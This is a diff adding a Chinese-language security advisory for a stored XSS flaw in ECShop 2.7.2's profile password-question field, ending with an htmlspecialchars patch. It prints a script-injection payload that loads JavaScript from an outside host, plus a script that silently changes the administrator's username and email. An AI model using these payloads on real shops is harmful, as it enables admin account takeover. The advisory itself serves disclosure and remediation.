@@ -1,0 +1,83 @@
+Ecshop2.7.2个人资料输入过滤不严
+last modify %%mtime(%Y-%m-%d %H:%M:%S %A)
+
+%! Target   : html
+%! Style    : http://shopexts.googlecode.com/files/vul.css
+%! Encoding : UTF-8
+%! Options  : --css-sugar
+%!postproc(html):  1.jpg   http://www.wooyun.org/upload/201009/201529321175f23b62d70f7033e2f001546c236f.jpg
+%!postproc(html):  2.jpg      http://www.wooyun.org/upload/201009/20153929b9ac1abec66d6b3f56c033e3c0ed690b.jpg
+%!postproc(html):  3.jpg        http://www.wooyun.org/upload/201009/201535039fb2c3af66dad10a97acf9d8b3b5958b.jpg
+
+
+====添加时间====
+ 
+2010-09-19
+ 
+====系统编号====
+ 
+SEC10091902
+ 
+====影响版本====
+ 
+Ecshop2.7.2
+ 
+====漏洞危害====
+ 
+个人资料修改时，Javascript代码过滤不够严格，XSS代码直接进入数据库，可获得管理员帐号。
+ 
+====漏洞原理====
+
+截图
+
+          [1.jpg]
+
+密码保护问题这一项，没有使用正则过滤，其他的的都有正则过滤。我们可以在密码保护问题里输入XSS，但是后台查看会员资料是不显示密码保护问题的，所以这里必须要网站后台添加了新的 “会员注册项”时，后台查看资料就会显示了，此处填入一段引入外部js的代码:
+
+```
+"><script src="http://www.***.com/test.js" type="text/javascript"></script>
+```
+
+外部test.js文件内容如下
+
+```
+Ajax.call('privilege.php?act=update','id=1&user_name=heihei&email=10001@qq.com','',"POST","JSON");
+```
+
+
+====检测方法====
+
+          [2.jpg]
+
+
+          [3.jpg]
+
+
+====解决方案====
+
+1）补丁下载地址
+
+http://downtcom.shopex.cn/update/sec10091901.zip
+
+2）如果要自行修复，请将/core/api/include/api_link.php
+
+
+程序的504行
+```
+$temp_field_content = strlen($_POST[$extend_field_index]) > 100 ? mb_substr($_POST[$extend_field_index], 0, 99) : $_POST[$extend_field_index];
+```
+
+修改为
+```
+$temp_field_content = strlen($_POST[$extend_field_index]) > 100 ? mb_substr(htmlspecialchars($_POST[$extend_field_index]), 0, 99) : htmlspecialchars($_POST[$extend_field_index]);
+```
+
+====信息来源====
+
+WooYun.org
+
+http://www.wooyun.org/bug.php?action=view&id=581
+
+
+
+
